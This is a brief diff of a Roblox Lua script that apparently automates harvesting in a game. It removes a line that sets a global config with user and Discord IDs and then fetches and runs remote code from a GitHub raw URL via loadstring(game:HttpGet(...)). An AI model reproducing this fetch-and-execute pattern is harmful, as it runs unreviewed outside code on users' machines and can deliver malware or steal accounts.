@@ -480,4 +480,3 @@ end
 while task.wait(INTERVAL) do
     harvestAndSubmit()
 end
-_G.Config = { UserID = "85a00e19-30eb-4b2f-acfd-a9634446a76c", discord_id = "1067392103585423440" , Note = "Pc", } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/gag"))()
